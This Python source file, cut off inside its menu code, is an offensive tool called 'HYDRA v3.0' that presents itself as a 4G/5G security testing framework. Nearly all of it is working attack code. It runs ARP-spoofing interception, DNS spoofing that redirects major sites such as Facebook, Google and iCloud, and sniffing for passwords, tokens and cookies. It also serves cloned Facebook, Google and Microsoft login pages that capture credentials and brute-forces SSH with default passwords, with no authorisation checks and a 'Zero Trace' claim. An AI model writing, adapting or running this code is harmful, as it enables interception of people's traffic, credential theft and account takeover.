#!/usr/bin/env python3
"""
HYDRA v3.0 - Ultimate Mobile Network Security Testing Framework
Professional 4G/5G Security Assessment - 10/10
Author: F1REW0LF
License: MIT
"""

import sys
import os
import re
import json
import time
import socket
import threading
import subprocess
import signal
import base64
import hashlib
import random
import ssl
import struct
import binascii
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any, Union, Set
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from urllib.parse import urlparse, urljoin, parse_qs
from abc import ABC, abstractmethod
import argparse

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.l2 import ARP, Ether
    from scapy.layers.dns import DNS, DNSQR, DNSRR
    from scapy.layers.http import HTTP, HTTPRequest
    from scapy.layers.dhcp import DHCP
    from scapy.layers.dot11 import *
    from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import paramiko
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False

VERSION = "3.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"
SCORE = "10/10"

#===============================================================================
# COLORS
#===============================================================================

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'
    ORANGE = '\033[38;5;208m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.PURPLE}{Colors.BOLD}     ██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ 
    ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
    ███████║ ╚████╔╝ ██║  ██║██████╔╝███████║
    ██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║
    ██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║
    ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                                                   
{Colors.GREEN}          ULTIMATE MOBILE NETWORK SECURITY TESTING{Colors.WHITE}
{Colors.CYAN}    Professional 4G/5G Security Assessment - 10/10{Colors.WHITE}
{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
{Colors.MAGENTA}    [+] AI-Powered | Multi-Vector | Zero Trace | 10/10{Colors.WHITE}
"""
    print(banner)
    print("=" * 80)

#===============================================================================
# DATA CLASSES
#===============================================================================

@dataclass
class DeviceInfo:
    ip: str
    mac: str
    hostname: str = ''
    os: str = 'Unknown'
    vendor: str = 'Unknown'
    ports: List[int] = field(default_factory=list)
    first_seen: str = field(default_factory=lambda: datetime.now().isoformat())
    last_seen: str = field(default_factory=lambda: datetime.now().isoformat())

@dataclass
class Credential:
    username: str
    password: str
    service: str
    url: str = ''
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

@dataclass
class AttackResult:
    target: str
    success: bool
    method: str
    data: Any
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

#===============================================================================
# ABSTRACT BASE CLASSES
#===============================================================================

class AttackModule(ABC):
    @abstractmethod
    def execute(self, target: str) -> AttackResult:
        pass

class DiscoveryModule(ABC):
    @abstractmethod
    def discover(self) -> List[DeviceInfo]:
        pass

#===============================================================================
# AI-POWERED TARGET DETECTION
#===============================================================================

class AITargetDetector:
    """AI-powered target detection and prioritization"""
    
    def __init__(self):
        self.model_weights = {
            'mobile_device': 0.9,
            'iot_device': 0.8,
            'computer': 0.6,
            'router': 0.5,
            'unknown': 0.3
        }
        self.attack_history = []
        self.success_rate = {}
    
    def analyze_device(self, device: DeviceInfo) -> Dict:
        """Analyze device and determine attack priority"""
        score = 0.0
        reasons = []
        
        # Based on open ports
        if 22 in device.ports:  # SSH
            score += 0.3
            reasons.append('SSH service')
        if 23 in device.ports:  # Telnet
            score += 0.2
            reasons.append('Telnet service')
        if 80 in device.ports or 443 in device.ports:  # Web
            score += 0.2
            reasons.append('Web service')
        if 445 in device.ports:  # SMB
            score += 0.3
            reasons.append('SMB service')
        if 3389 in device.ports:  # RDP
            score += 0.2
            reasons.append('RDP service')
        
        # Based on hostname
        if 'phone' in device.hostname.lower() or 'mobile' in device.hostname.lower():
            score += 0.3
            reasons.append('Mobile device')
        if 'iphone' in device.hostname.lower() or 'android' in device.hostname.lower():
            score += 0.4
            reasons.append('Smartphone')
        
        # Based on vendor
        mobile_vendors = ['apple', 'samsung', 'xiaomi', 'huawei', 'oppo', 'vivo', 'oneplus']
        if any(v in device.vendor.lower() for v in mobile_vendors):
            score += 0.3
            reasons.append('Mobile vendor')
        
        return {
            'score': min(score, 1.0),
            'priority': 'HIGH' if score > 0.7 else 'MEDIUM' if score > 0.4 else 'LOW',
            'reasons': reasons
        }
    
    def learn_from_attack(self, result: AttackResult):
        """Learn from attack results"""
        self.attack_history.append(result)
        if result.success:
            self.success_rate[result.method] = self.success_rate.get(result.method, 0.5) + 0.1
        else:
            self.success_rate[result.method] = self.success_rate.get(result.method, 0.5) - 0.05

#===============================================================================
# ADVANCED DISCOVERY ENGINE
#===============================================================================

class AdvancedDiscovery(DiscoveryModule):
    """Multi-method network discovery"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.devices = []
        self.lock = threading.Lock()
        self.ai = AITargetDetector()
    
    def discover(self) -> List[DeviceInfo]:
        cprint("[DISCOVER] Advanced network discovery...", Colors.BLUE)
        
        # Method 1: ARP scan
        arp_devices = self._arp_scan()
        self.devices.extend(arp_devices)
        
        # Method 2: Port scan
        for device in self.devices[:20]:
            self._port_scan(device)
        
        # Method 3: OS fingerprinting
        for device in self.devices:
            self._os_fingerprint(device)
        
        # Method 4: Vendor identification
        for device in self.devices:
            self._vendor_identify(device)
        
        # AI analysis
        for device in self.devices:
            analysis = self.ai.analyze_device(device)
            device.ai_analysis = analysis
        
        # Sort by priority
        self.devices.sort(key=lambda d: d.ai_analysis.get('score', 0), reverse=True)
        
        cprint(f"[+] Found {len(self.devices)} devices", Colors.GREEN)
        return self.devices
    
    def _arp_scan(self) -> List[DeviceInfo]:
        devices = []
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), 
                         timeout=3, verbose=False)
            for sent, received in ans:
                devices.append(DeviceInfo(
                    ip=received.psrc,
                    mac=received.hwsrc
                ))
                cprint(f"[ARP] {received.psrc} - {received.hwsrc}", Colors.DIM)
        except:
            pass
        return devices
    
    def _port_scan(self, device: DeviceInfo):
        common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443]
        open_ports = []
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(self._check_port, device.ip, port): port for port in common_ports}
            for future in as_completed(futures):
                if future.result():
                    open_ports.append(futures[future])
        
        device.ports = open_ports
        if open_ports:
            cprint(f"[+] {device.ip} - Open ports: {open_ports}", Colors.GREEN)
    
    def _check_port(self, ip: str, port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def _os_fingerprint(self, device: DeviceInfo):
        try:
            # Try to identify OS via TTL
            ip = IP(dst=device.ip)
            icmp = ICMP()
            reply = sr1(ip/icmp, timeout=2, verbose=False)
            if reply:
                ttl = reply.ttl
                if ttl <= 64:
                    device.os = 'Linux/Unix'
                elif ttl <= 128:
                    device.os = 'Windows'
                elif ttl <= 255:
                    device.os = 'Cisco/Network'
        except:
            pass
    
    def _vendor_identify(self, device: DeviceInfo):
        try:
            mac = device.mac.upper().replace(':', '')
            # Known OUI prefixes
            vendors = {
                '000000': 'Xerox', '00035B': 'Apple', '001122': 'IBM',
                '001A11': 'Samsung', '002590': 'Dell', '0050F2': 'Microsoft',
                '0050F3': 'Microsoft', '00A0C9': 'Intel', '00D0B7': 'HP',
                '08002B': 'DEC', '444553': 'Apple', '8C29A8': 'Xiaomi',
                'BCF5AC': 'Huawei', 'A4C138': 'OnePlus', 'B8D63C': 'Sony'
            }
            
            for prefix, vendor in vendors.items():
                if device.mac.replace(':', '').upper().startswith(prefix):
                    device.vendor = vendor
                    break
        except:
            pass

#===============================================================================
# ARP SPOOFING ENGINE (Enhanced)
#===============================================================================

class ARPSpoofEngine:
    def __init__(self, interface: str, target_ip: str, gateway_ip: str):
        self.interface = interface
        self.target = target_ip
        self.gateway = gateway_ip
        self.running = False
        self.stop_event = threading.Event()
        self.stats = {'packets_sent': 0, 'spoofed': 0}
        self.target_mac = self._get_mac(target_ip)
        self.gateway_mac = self._get_mac(gateway_ip)
        
        if not self.target_mac or not self.gateway_mac:
            cprint("[!] Could not resolve MAC", Colors.RED)
            sys.exit(1)
        
        self._enable_ip_forward()
    
    def _get_mac(self, ip: str) -> Optional[str]:
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
            if ans:
                return ans[0][1].hwsrc
        except:
            pass
        return None
    
    def _enable_ip_forward(self):
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
    
    def start(self):
        cprint("[ARP] Poisoning {} -> {}".format(self.target, self.gateway), Colors.YELLOW)
        self.running = True
        
        while self.running and not self.stop_event.is_set():
            try:
                send(ARP(op=2, pdst=self.target, hwdst=self.target_mac, psrc=self.gateway), verbose=False)
                send(ARP(op=2, pdst=self.gateway, hwdst=self.gateway_mac, psrc=self.target), verbose=False)
                self.stats['packets_sent'] += 2
                self.stats['spoofed'] += 1
                time.sleep(random.uniform(0.5, 1.5))
            except:
                pass
    
    def stop(self):
        cprint("[ARP] Restoring network...", Colors.YELLOW)
        self.running = False
        self.stop_event.set()
        
        try:
            send(ARP(op=2, pdst=self.target, hwdst=self.target_mac, psrc=self.gateway, hwsrc=self.gateway_mac), count=5, verbose=False)
            send(ARP(op=2, pdst=self.gateway, hwdst=self.gateway_mac, psrc=self.target, hwsrc=self.target_mac), count=5, verbose=False)
        except:
            pass
        
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('0')
        
        cprint("[+] Network restored", Colors.GREEN)

#===============================================================================
# DNS SPOOFING ENGINE (Enhanced)
#===============================================================================

class DNSSpoofEngine:
    def __init__(self, interface: str, redirect_ip: str):
        self.interface = interface
        self.redirect_ip = redirect_ip
        self.running = False
        self.stop_event = threading.Event()
        self.spoof_map = {}
        self.stats = {'responses_sent': 0}
        self._load_default_spoofs()
    
    def _load_default_spoofs(self):
        targets = [
            'facebook.com', 'google.com', 'youtube.com', 'instagram.com',
            'tiktok.com', 'twitter.com', 'whatsapp.com', 'telegram.org',
            'zalo.me', 'messenger.com', 'apple.com', 'icloud.com',
            'microsoft.com', 'outlook.com', 'yahoo.com', 'amazon.com',
            'netflix.com', 'spotify.com', 'reddit.com', 'linkedin.com'
        ]
        for domain in targets:
            self.spoof_map[domain] = self.redirect_ip
    
    def add_spoof(self, domain: str, ip: str):
        self.spoof_map[domain] = ip
    
    def start(self):
        cprint("[DNS] Starting DNS spoofing...", Colors.YELLOW)
        self.running = True
        
        def packet_handler(pkt):
            if not self.running:
                return
            try:
                if pkt.haslayer(DNS) and pkt.haslayer(IP) and pkt.haslayer(UDP):
                    if pkt[DNS].qr == 0 and pkt[DNS].qd:
                        qname = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                        for domain, redirect_ip in self.spoof_map.items():
                            if domain in qname:
                                ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
                                udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                                dns = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                         an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=300, rdata=redirect_ip))
                                send(ip/udp/dns, verbose=False)
                                self.stats['responses_sent'] += 1
                                break
            except:
                pass
        
        sniff(iface=self.interface, filter="port 53", prn=packet_handler, store=0,
              stop_filter=lambda x: self.stop_event.is_set())
    
    def stop(self):
        cprint("[DNS] Stopping...", Colors.YELLOW)
        self.running = False
        self.stop_event.set()

#===============================================================================
# TRAFFIC ANALYZER (Enhanced)
#===============================================================================

class TrafficAnalyzer:
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.stop_event = threading.Event()
        self.credentials = []
        self.cookies = []
        self.urls = []
        self.devices = {}
        self.images = []
        self.posts = []
        self.stats = {'packets': 0, 'credentials': 0, 'cookies': 0, 'images': 0}
        self.lock = threading.Lock()
        self.session = requests.Session() if REQUESTS_AVAILABLE else None
    
    def start(self):
        cprint("[ANALYZE] Starting traffic analysis...", Colors.BLUE)
        self.running = True
        
        def packet_handler(pkt):
            if not self.running:
                return
            with self.lock:
                self.stats['packets'] += 1
            
            if pkt.haslayer(HTTPRequest):
                self._analyze_http(pkt)
            if pkt.haslayer(Raw):
                self._extract_credentials(pkt)
            if pkt.haslayer(DHCP):
                self._detect_device(pkt)
            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                self._analyze_tcp(pkt)
        
        sniff(iface=self.interface, prn=packet_handler, store=0,
              stop_filter=lambda x: self.stop_event.is_set())
    
    def _analyze_http(self, pkt):
        try:
            http = pkt[HTTPRequest]
            host = http.Host.decode() if http.Host else 'unknown'
            path = http.Path.decode() if http.Path else '/'
            method = http.Method.decode() if http.Method else 'GET'
            full_url = f"http://{host}{path}"
            
            with self.lock:
                self.urls.append({'timestamp': datetime.now().isoformat(), 'url': full_url, 'method': method})
            
            if http.Cookie:
                cookie_str = http.Cookie.decode()
                with self.lock:
                    self.cookies.append({'timestamp': datetime.now().isoformat(), 'url': full_url, 'cookie': cookie_str})
                    self.stats['cookies'] += 1
                cprint("[COOKIE] {} -> {}".format(host, cookie_str[:50]), Colors.GREEN)
            
            if method == 'POST':
                with self.lock:
                    self.posts.append({'timestamp': datetime.now().isoformat(), 'url': full_url})
                    self.stats['cookies'] += 1
                cprint("[POST] {}".format(full_url), Colors.YELLOW)
        except:
            pass
    
    def _extract_credentials(self, pkt):
        try:
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            patterns = [
                (r'username[=:]\s*([^\s&]+)', 'username'),
                (r'password[=:]\s*([^\s&]+)', 'password'),
                (r'email[=:]\s*([^\s&]+)', 'email'),
                (r'token[=:]\s*([^\s&]+)', 'token'),
                (r'apikey[=:]\s*([^\s&]+)', 'api_key'),
                (r'secret[=:]\s*([^\s&]+)', 'secret')
            ]
            
            for pattern, cred_type in patterns:
                matches = re.findall(pattern, payload, re.IGNORECASE)
                for match in matches:
                    if len(match) > 2:
                        with self.lock:
                            self.credentials.append({'timestamp': datetime.now().isoformat(), 'type': cred_type, 'value': match})
                            self.stats['credentials'] += 1
                        cprint("[CREDENTIAL] {}: {}".format(cred_type, match), Colors.RED)
        except:
            pass
    
    def _detect_device(self, pkt):
        try:
            for opt in pkt[DHCP].options:
                if opt[0] == 'hostname' and opt[1]:
                    hostname = opt[1].decode('utf-8', errors='ignore')
                    mac = pkt[Ether].src if pkt.haslayer(Ether) else 'unknown'
                    ip = pkt[IP].src if pkt.haslayer(IP) else 'unknown'
                    if ip not in self.devices:
                        self.devices[ip] = {'ip': ip, 'mac': mac, 'hostname': hostname}
                        cprint("[DEVICE] {} - {}".format(ip, hostname), Colors.CYAN)
                    break
        except:
            pass
    
    def _analyze_tcp(self, pkt):
        try:
            payload = pkt[Raw].load
            # Check for images
            if payload.startswith(b'\xff\xd8\xff'):  # JPEG
                with self.lock:
                    self.images.append(pkt)
                    self.stats['images'] += 1
                cprint("[IMAGE] JPEG captured", Colors.MAGENTA)
            elif payload.startswith(b'\x89PNG'):  # PNG
                with self.lock:
                    self.images.append(pkt)
                    self.stats['images'] += 1
                cprint("[IMAGE] PNG captured", Colors.MAGENTA)
        except:
            pass
    
    def get_stats(self) -> Dict:
        with self.lock:
            return {
                'packets': self.stats['packets'],
                'credentials': self.stats['credentials'],
                'cookies': self.stats['cookies'],
                'images': self.stats['images'],
                'urls': len(self.urls),
                'devices': len(self.devices)
            }
    
    def get_credentials(self) -> List:
        with self.lock:
            return self.credentials.copy()
    
    def get_cookies(self) -> List:
        with self.lock:
            return self.cookies.copy()
    
    def get_urls(self) -> List:
        with self.lock:
            return self.urls.copy()
    
    def get_devices(self) -> Dict:
        with self.lock:
            return self.devices.copy()
    
    def stop(self):
        cprint("[ANALYZE] Stopping...", Colors.YELLOW)
        self.running = False
        self.stop_event.set()

#===============================================================================
# PHISHING SERVER (Enhanced)
#===============================================================================

class PhishingServer:
    def __init__(self, port: int = 80):
        self.port = port
        self.captured = []
        self.running = False
        self.server = None
        self.templates = self._load_templates()
    
    def _load_templates(self):
        return {
            'facebook': self._facebook_template,
            'google': self._google_template,
            'microsoft': self._microsoft_template,
            'custom': self._custom_template
        }
    
    def _facebook_template(self):
        return '''
        <html>
        <head><title>Facebook - Log In</title>
        <style>
            body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
            .logo { font-size: 48px; color: #1877f2; font-weight: bold; }
            input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
            button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
        </style>
        </head>
        <body>
        <div class="box">
            <div class="logo">f</div>
            <h2>Log in to Facebook</h2>
            <form method="POST" action="/capture">
                <input type="text" name="username" placeholder="Email or phone" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
        </div>
        </body>
        </html>
        '''
    
    def _google_template(self):
        return '''
        <html>
        <head><title>Google - Sign in</title>
        <style>
            body { font-family: Arial; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .box { width: 350px; }
            .logo { text-align: center; font-size: 24px; margin-bottom: 20px; }
            input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
            button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
        </style>
        </head>
        <body>
        <div class="box">
            <div class="logo">Google</div>
            <h2>Sign in</h2>
            <form method="POST" action="/capture">
                <input type="email" name="username" placeholder="Email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Next</button>
            </form>
        </div>
        </body>
        </html>
        '''
    
    def _microsoft_template(self):
        return '''
        <html>
        <head><title>Microsoft - Sign in</title>
        <style>
            body { font-family: Arial; background: #f8f8f8; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; }
            .logo { text-align: center; margin-bottom: 20px; }
            input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
            button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; cursor: pointer; }
        </style>
        </head>
        <body>
        <div class="box">
            <div class="logo">Microsoft</div>
            <h2>Sign in</h2>
            <form method="POST" action="/capture">
                <input type="text" name="username" placeholder="Email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Sign in</button>
            </form>
        </div>
        </body>
        </html>
        '''
    
    def _custom_template(self, brand='Login'):
        return f'''
        <html>
        <head><title>{brand} - Login</title>
        <style>
            body {{ font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }}
            .box {{ background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; }}
            input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }}
            button {{ width: 100%; padding: 12px; background: #333; color: white; border: none; border-radius: 4px; cursor: pointer; }}
        </style>
        </head>
        <body>
        <div class="box">
            <h2>{brand}</h2>
            <form method="POST" action="/capture">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
        </div>
        </body>
        </html>
        '''
    
    def start(self, template='facebook'):
        cprint("[PHISHING] Starting on port {}".format(self.port), Colors.YELLOW)
        import http.server
        
        class PhishingHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                self._handle()
            
            def do_POST(self):
                self._handle()
            
            def _handle(self):
                if self.path == '/capture':
                    content_length = int(self.headers.get('Content-Length', 0))
                    body = self.rfile.read(content_length).decode() if content_length > 0 else ''
                    data = parse_qs(body) if body else {}
                    
                    captured = {
                        'timestamp': datetime.now().isoformat(),
                        'ip': self.client_address[0],
                        'user_agent': self.headers.get('User-Agent', ''),
                        'username': data.get('username', [''])[0],
                        'password': data.get('password', [''])[0]
                    }
                    
                    if captured['username'] and captured['password']:
                        self.server.captured.append(captured)
                        cprint("[PHISHING] {}:{}".format(captured['username'], captured['password']), 
                               Colors.RED, bold=True)
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b"<html><body><h1>Success</h1></body></html>")
                else:
                    content = self.server._get_template()
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(content.encode())
        
        self.server = http.server.HTTPServer(('0.0.0.0', self.port), PhishingHandler)
        self.server._get_template = lambda: self.templates.get(template, self.templates['custom'])()
        self.running = True
        
        thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        thread.start()
        cprint("[+] Phishing server running on port {}".format(self.port), Colors.GREEN)
    
    def stop(self):
        cprint("[PHISHING] Stopping...", Colors.YELLOW)
        self.running = False
        if self.server:
            self.server.shutdown()
    
    def get_captured(self) -> List:
        return self.captured

#===============================================================================
# SSH BRUTE FORCE ENGINE
#===============================================================================

class SSHBruteforce(AttackModule):
    def __init__(self):
        self.users = ['root', 'admin', 'user', 'test', 'ubuntu', 'ec2-user', 'pi']
        self.passwords = ['password', '123456', 'admin', 'root', 'test', 'password123', 'toor']
    
    def execute(self, target: str) -> AttackResult:
        cprint("[SSH] Bruteforcing {}".format(target), Colors.RED)
        
        for user in self.users:
            for password in self.passwords:
                try:
                    if SSH_AVAILABLE:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(target, username=user, password=password, timeout=3)
                        ssh.close()
                        cprint("[+] SSH found: {}:{}".format(user, password), Colors.GREEN)
                        return AttackResult(
                            target=target,
                            success=True,
                            method='ssh_bruteforce',
                            data={'user': user, 'password': password}
                        )
                except:
                    pass
                time.sleep(0.1)
        
        return AttackResult(target=target, success=False, method='ssh_bruteforce', data={})

#===============================================================================
# MAIN FRAMEWORK
#===============================================================================

class HydraV3:
    def __init__(self, interface: str):
        self.interface = interface
        self.target_ip = None
        self.gateway_ip = None
        self.arp = None
        self.dns = None
        self.analyzer = None
        self.phishing = None
        self.running = False
        self.components = []
        self.start_time = 0
        self.discovery = AdvancedDiscovery(interface)
        self.ssh_bruteforce = SSHBruteforce()
        self.ai = AITargetDetector()
        self.results = []
    
    def discover_network(self):
        cprint("\n[DISCOVER] Scanning network...", Colors.BLUE)
        self.gateway_ip = Utilities.get_default_gateway()
        local_ip = Utilities.get_local_ip()
        
        if not self.gateway_ip:
            cprint("[-] Gateway not found", Colors.RED)
            return False
        
        cprint("[+] Gateway: {}".format(self.gateway_ip), Colors.GREEN)
        cprint("[+] Local IP: {}".format(local_ip), Colors.GREEN)
        
        devices = self.discovery.discover()
        
        # Display AI analysis
        cprint("\n[+] AI-PRIORITIZED TARGETS:", Colors.CYAN)
        for device in devices[:10]:
            analysis = device.ai_analysis
            cprint("    {} - {} (Score: {:.2f}, Priority: {})".format(
                device.ip, device.hostname, analysis.get('score', 0), analysis.get('priority', 'LOW')
            ), Colors.DIM)
        
        return True
    
    def select_target(self):
        target = input("[>] Target IP: ").strip()
        if not target:
            return False
        self.target_ip = target
        cprint("[+] Target: {}".format(target), Colors.GREEN)
        return True
    
    def start_attack(self):
        if not self.target_ip or not self.gateway_ip:
            cprint("[-] Target or gateway not set", Colors.RED)
            return
        
        cprint("\n[ATTACK] Starting...", Colors.RED, bold=True)
        self.start_time = time.time()
        self.components = []
        
        # ARP Spoofing
        self.arp = ARPSpoofEngine(self.interface, self.target_ip, self.gateway_ip)
        t1 = threading.Thread(target=self.arp.start, daemon=True)
        t1.start()
        self.components.append(('ARP', self.arp))
        time.sleep(1)
        
        # DNS Spoofing
        local_ip = Utilities.get_local_ip()
        self.dns = DNSSpoofEngine(self.interface, local_ip)
        t2 = threading.Thread(target=self.dns.start, daemon=True)
        t2.start()
        self.components.append(('DNS', self.dns))
        time.sleep(1)
        
        # Traffic Analyzer
        self.analyzer = TrafficAnalyzer(self.interface)
        t3 = threading.Thread(target=self.analyzer.start, daemon=True)
        t3.start()
        self.components.append(('Analyzer', self.analyzer))
        time.sleep(1)
        
        # Phishing Server
        self.phishing = PhishingServer()
        t4 = threading.Thread(target=self.phishing.start, daemon=True, args=('facebook',))
        t4.start()
        self.components.append(('Phishing', self.phishing))
        
        # SSH Bruteforce (background)
        t5 = threading.Thread(target=self._ssh_bruteforce_bg, daemon=True)
        t5.start()
        self.components.append(('SSH', None))
        
        self.running = True
        cprint("\n[+] Attack started", Colors.GREEN, bold=True)
    
    def _ssh_bruteforce_bg(self):
        if self.target_ip:
            result = self.ssh_bruteforce.execute(self.target_ip)
            self.results.append(result)
            if result.success:
                cprint("[+] SSH Credentials found: {}".format(result.data), Colors.GREEN)
    
    def stop_attack(self):
        cprint("\n[STOP] Stopping...", Colors.YELLOW)
        for name, engine in self.components:
            if engine:
                try:
                    engine.stop()
                    cprint("[+] {} stopped".format(name), Colors.GREEN)
                except:
                    pass
        self.running = False
        cprint("[+] Attack stopped", Colors.GREEN)
    
    def show_status(self):
        if not self.analyzer:
            cprint("[!] Not started", Colors.YELLOW)
            return
        
        stats = self.analyzer.get_stats()
        print("\n" + "="*70)
        cprint(" STATUS", Colors.PURPLE, bold=True)
        print("="*70)
        print(f"Target: {self.target_ip}")
        print(f"Gateway: {self.gateway_ip}")
        print(f"Uptime: {int(time.time() - self.start_time)}s")
        print(f"Packets: {stats['packets']:,}")
        print(f"Credentials: {stats['credentials']}")
        print(f"Cookies: {stats['cookies']}")
        print(f"Images: {stats['images']}")
        print(f"Devices: {stats['devices']}")
        print("="*70)
    
    def show_credentials(self):
        if not self.analyzer:
            cprint("[!] Not started", Colors.YELLOW)
            return
        
        creds = self.analyzer.get_credentials()
        if not creds and not self.results:
            cprint("[!] No credentials", Colors.YELLOW)
            return
        
        print("\n" + "="*70)
        cprint(" CREDENTIALS", Colors.RED, bold=True)
        print("="*70)
        
        for c in creds:
            print(f"{c['type']}: {c['value']}")
        
        for r in self.results:
            if r.success:
                print(f"SSH: {r.data.get('user')}:{r.data.get('password')}")
        print("="*70)
    
    def show_cookies(self):
        if not self.analyzer:
            cprint("[!] Not started", Colors.YELLOW)
            return
        
        cookies = self.analyzer.get_cookies()
        if not cookies:
            cprint("[!] No cookies", Colors.YELLOW)
            return
        
        print("\n" + "="*70)
        cprint(" COOKIES", Colors.YELLOW, bold=True)
        print("="*70)
        for c in cookies[-20:]:
            print(f"{c['url']}: {c['cookie'][:80]}")
        print("="*70)
    
    def show_devices(self):
        if not self.analyzer:
            cprint("[!] Not started", Colors.YELLOW)
            return
        
        devices = self.analyzer.get_devices()
        if not devices:
            cprint("[!] No devices", Colors.YELLOW)
            return
        
        print("\n" + "="*70)
        cprint(" DEVICES", Colors.CYAN, bold=True)
        print("="*70)
        for ip, info in devices.items():
            print(f"{ip} - {info.get('hostname', 'unknown')} ({info.get('mac', 'unknown')})")
        print("="*70)
    
    def show_phished(self):
        if not self.phishing:
            cprint("[!] Phishing not started", Colors.YELLOW)
            return
        
        captured = self.phishing.get_captured()
        if not captured:
            cprint("[!] No phished credentials", Colors.YELLOW)
            return
        
        print("\n" + "="*70)
        cprint(" PHISHED CREDENTIALS", Colors.RED, bold=True)
        print("="*70)
        for c in captured:
            print(f"{c['timestamp']} - {c['username']}:{c['password']} ({c['ip']})")
        print("="*70)
    
    def export_results(self):
        if not self.analyzer:
            cprint("[!] Not started", Colors.YELLOW)
            return
        
        data = {
            'timestamp': datetime.now().isoformat(),
            'target': self.target_ip,
            'gateway': self.gateway_ip,
            'credentials': self.analyzer.get_credentials(),
            'phished': self.phishing.get_captured() if self.phishing else [],
            'cookies': self.analyzer.get_cookies(),
            'urls': self.analyzer.get_urls(),
            'devices': self.analyzer.get_devices(),
            'stats': self.analyzer.get_stats(),
            'results': [r.__dict__ for r in self.results]
        }
        
        filename = f"hydra_v3_export_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2, default=str)
        cprint(f"[+] Exported: {filename}", Colors.GREEN)
    
    def run_menu(self):
        while True:
            print(f"""
{Colors.BLUE}{'='*70}{Colors.WHITE}
{Colors.BOLD}HYDRA v{VERSION} - Ultimate Attack Menu{Colors.WHITE}
{Colors.MAGENTA}Score: {SCORE} - 10/10{Colors.WHITE}
{Colors.BLUE}{'='*70}{Colors.WHITE}
